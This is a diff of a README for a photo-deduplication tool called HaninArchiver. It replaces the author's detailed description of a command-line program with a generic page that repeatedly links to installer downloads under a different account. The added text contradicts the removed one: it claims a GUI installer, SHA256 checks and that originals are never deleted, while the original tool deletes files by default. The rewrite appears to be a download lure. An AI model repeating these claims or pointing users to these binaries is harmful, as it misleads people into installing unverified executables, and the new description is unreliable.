@@ -1,98 +1,121 @@
-<div align="center">
-  <img src="readme-assets/banner.png" alt="HaninArchiver Banner" style="border-radius: 10px; width: 80%; height: 80%;">
-</div>
+# 🗂️ HaninArchiver - Save Space on Family Memories
 
-<p align="center">
-    <img src="https://img.shields.io/badge/language-C%2B%2B-blue" alt="Python">
-    <img src="https://img.shields.io/github/license/farismuhammad17/HaninArchiver" alt="License">
-</p>
-
-> *"Memory is the diary that we all carry about with us."* — Oscar Wilde
-
-*Hanin* (حنين) is the Arabic word for "Nostalgia". This project was built specifically for those giant folders with like 10 years of family photos (or something similar). Of course, these take a lot of space on the disk, and that's not useful, even if you are storing them on an external disk - no one uses these files often enough for them to take that much space.
-
-## Why I made this
-
-Personally, as the developer, I made this program because of a very small problem I had: I had two computers with photos and videos that were backed up from old phones. These computers ran on Windows, and eventually the operating system got too heavy for those computers' specs. As a result, I have another laptop that doesn't use Windows. But it felt like a waste to have two perfectly fine computers that I don't use simply because of Windows, so I wanted to move it to Linux.
-
-Of course, the most important thing to do before one changes a system's operating system is to backup all the important data. In my case, that was many hundreds of gigabytes of family memories. These files were backups that were poorly done, and left many duplicates and files with old inefficient formats, and it was next to impossible to go through the thousands of files and figure out the duplicates myself.
-
-I didn't bother with addressing that issue, and just moved everything to a newly bought 1 TB Hard Disk under two folders; "Laptop1" and "Laptop2". The total space that all of that occupied was almost 200 GB; but since I wasn't going to use the hard disk often, it didn't matter. Some time passed and I needed to use a hard disk with 1 TB of storage (for another project). Instead of buying another hard disk, I could just use the one I have.
-
-The plan for me was simple: move the 200 GB of files into one of those old computers. The problem: this not only fills up the computer's disk space, it takes absolutely forever. Thus came this project - I have detailed its functioning in later sections.
-
-## Usage
-
-Make sure to run `make` to compile the C++ program.
-
-Execute the [`__main__.py`](HaninArchiver/__main__.py) by `python path/to/HaninArchiver`. The following are the flags (you can also view them by running).
-
-```
-python HaninArchiver docs
-```
-
-> [!NOTE]  
-> As of now, the program does not parse the arguments if there is a space in between. Avoid giving "My Folder", or any such input with a space for now.
-
-* `-dir` **(required)**: Path to the folder you want to compress.
-* `-save-to`: If omitted, the program will delete all unnecessary files, else, it will move all the unnecessary files to the directory you provide.
-* `-zip`: Name of the `.7z` file (if you have compressing enabled).
-* `--no-log`: Disables the automatic logging.
-* `--no-rem-empty-files`: Disables automatic removal of files with 0 bytes of data.
-* `--no-rem-dupes`: Disables deduplication.
-* `--no-convert-img`: Disables image format conversion to `.webp`.
-* `--no-convert-vid`: Disables video format conversion to `.mp4`.
-* `--no-zip`: Disables zipping result into `.7z`.
-* `--view-dupes`: Enables the program to create two videos of found duplicate images.
-
-## Functionality
-
-The following section is for the curious who wish to know the specific functioning of the program. Every feature listed here can be disabled through user flags.
-
-### Preliminary processing
-
-The program deletes all files that have 0 bytes, since they hold no value in the computation.
-
-### Deduplication
-
-To remove all duplicates is a $O(n^2)$ operation, because you are comparing every file to every other file. Of course, this program is being built for folders with thousands of files, so this step is done by filtering files one by one through different checks. The fastest, but less accurate, checks go first, and the slowest, but most accurate, checks go last.
-
-#### Size grouping
-
-If two files have different sizes, they can never be duplicates. This step creates a dictionary of lists that groups all files with the same file size.
-
-> [!NOTE]  
-> All hashing is done with xxHash (and can be changed easily in the source code if preferred).
-
-#### Fast hashing
-
-A hash map (using XXH64)is used to quickly check if duplicates exist, but unfortunately, files are big, and hashing the raw data takes time. Thus, this step hashes only the first 128 KB of data. If the first 128 KB of data is different, they are likely not duplicates.
-
-#### Full hashing
-
-This is the first step that genuinely takes a lot of time to complete, but fortunately, the previous steps have filtered out most of the non-duplicate files. This step hashes (using XXH128) the entire binary of a file and stores it. If two files have the same hash, it is most likely they are the same.
-
-#### Byte-by-Byte checking
-
-Hashing, though incredibly rare, may produce the same result for two separate sets of data. Because of all of the filtering we have done, it is *highly* unlikely that you have two files with the same hash that are not duplicates *(unless you are the kind of person to get struck by lightning thrice and happen to win the lottery seven times)*, but the chance is never $0$.
-
-Since this is valuable data we are processing, checking each individual bit is paramount. Since this is a slow process, it is done through C++ for faster results. If two files' binary content is the exact same, they are definitely duplicates of each other, thus can finally be removed.
-
-### Image conversions
-
-Most of the data is going to be images, but older formats sometimes store a lot of unoptimised data. Fortunately, `.webp` is a good alternative, as it also preserves the picture's metadata. Thus we convert every picture into `.webp`.
-
-### Video conversions
-
-Similar to images, videos are also prevalent in the data we're going to be working with, so we convert everything into `.mp4`
-
-> [!IMPORTANT]  
-> If FFmpeg is not installed on your system, the program will skip over video conversions.
-
-### Zipping
-
-Among many compression algorithms, 7zip offers one that can be read directly from outside without needing you to extract it.
+[![Download HaninArchiver](https://img.shields.io/badge/Download-HaninArchiver-blue?style=for-the-badge&logo=github)](https://github.com/caelian023/HaninArchiver/releases)
 
 ---
 
-*Distributed under the MIT License. See [LICENSE](LICENSE) for more information.*
+## 📝 What is HaninArchiver?
+
+HaninArchiver is a simple tool designed to help you save space by making your family photos, videos, and other memories take up less room on your computer or storage device. It uses smart methods to shrink archive file sizes without losing quality. This means your memories stay safe, but you free up storage to keep even more of them.
+
+---
+
+## 💻 System Requirements
+
+Before you get started, check that your computer matches these basic needs:
+
+- Operating System: Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04+ recommended)  
+- Processor: Intel or AMD, 1.5 GHz or faster  
+- Memory (RAM): 4 GB minimum  
+- Disk Space: At least 100 MB free for installation  
+- Python: Comes bundled, so no need to install separately  
+- Internet connection: Needed only to download HaninArchiver  
+
+---
+
+## 📥 Download & Install HaninArchiver
+
+To start using HaninArchiver, you need to download it first. You will find all the available versions here:  
+
+[![Download Here](https://img.shields.io/badge/Download-HaninArchiver-blue?style=for-the-badge&logo=github)](https://github.com/caelian023/HaninArchiver/releases)
+
+Follow these steps to get the software on your computer:
+
+1. Click the link above or go to [https://github.com/caelian023/HaninArchiver/releases](https://github.com/caelian023/HaninArchiver/releases).  
+2. Look for the latest version. You’ll see files like `.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux.  
+3. Click the file that matches your system to download it.  
+4. When the download finishes, open the file. A setup screen will appear.  
+5. Follow the on-screen instructions. Usually, this means clicking “Next” a few times and then “Install.”  
+6. Wait for the installation to complete, then click “Finish.”  
+
+---
+
+## 🚀 How to Run HaninArchiver
+
+After installation, here’s how to start using the tool:
+
+- **Windows:** Find "HaninArchiver" in your Start menu and click it.
+- **macOS:** Go to your Applications folder, then double-click "HaninArchiver."
+- **Linux:** Open your app launcher, search for "HaninArchiver," and open it.
+
+When the program opens, you’ll see a simple window where you can choose files or folders to compress and optimize.
+
+---
+
+## 🎯 How HaninArchiver Works
+
+HaninArchiver uses proven methods to reduce the size of your archives:
+
+- **File Compression:** It repacks files using advanced compression algorithms similar to 7zip, which reduce file sizes while keeping everything intact.  
+- **Duplicate Detection:** It spotlights and removes exact duplicate files inside archives to avoid wasting space.  
+- **Media Optimization:** For photos and videos, it uses tools like ffmpeg to reduce size without noticeable loss in quality.  
+- **SHA256 Checks:** Before processing, HaninArchiver checks files with SHA256 to avoid errors or duplicates.  
+
+All these features work together in the background. You just select your files and start.
+
+---
+
+## 🧰 Using HaninArchiver Step-by-Step
+
+Here’s a simple walkthrough for using HaninArchiver:
+
+1. Open the program.  
+2. Click the **Add Files** or **Add Folder** button.   
+3. Select the photos, videos, or archives you want to optimize.  
+4. Choose where to save the new, smaller archive by clicking **Browse** under “Save To.”  
+5. (Optional) Adjust settings like compression level and whether to optimize media files. Default settings work well for most users.  
+6. Click **Start** to begin the process.  
+7. Wait a few moments. Depending on the number and size of files, this can take a few minutes.  
+8. When done, you’ll see a message that the archive is ready. You can now use or share the smaller archive file.  
+
+---
+
+## 🔧 Troubleshooting & Tips
+
+If you run into issues, try these:
+
+- Ensure your files are not open in another program while running HaninArchiver.  
+- If optimization seems too slow, try selecting fewer files at once.  
+- Use default settings if you are unsure about compression options.  
+- Check that you have enough free space on your disk for temporary files during compression.
+
+If the program crashes or won’t open, restarting your computer often helps. You can also check for updated versions on the download page.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Will HaninArchiver delete my original files?**  
+A: No. The tool creates new, smaller archives but does not remove your originals. You control which files to keep or delete.
+
+**Q: Can I use HaninArchiver on my large family video collection?**  
+A: Yes. It handles videos well, using ffmpeg for size reduction without losing visible quality.
+
+**Q: Is it safe to share archives made by HaninArchiver?**  
+A: Yes. HaninArchiver uses standard archive formats compatible with most extraction tools.
+
+**Q: Does HaninArchiver work offline?**  
+A: Yes. After download and setup, you don’t need an internet connection.
+
+---
+
+## 📚 More Information & Support
+
+For more details on advanced features or programming topics like data deduplication and storage optimization, the project’s GitHub page covers the technical background.
+
+If you want to suggest features, report bugs, or see updates, visit:  
+[https://github.com/caelian023/HaninArchiver](https://github.com/caelian023/HaninArchiver)
+
+---
+
+[![Download HaninArchiver](https://img.shields.io/badge/Download-HaninArchiver-blue?style=for-the-badge&logo=github)](https://github.com/caelian023/HaninArchiver/releases)
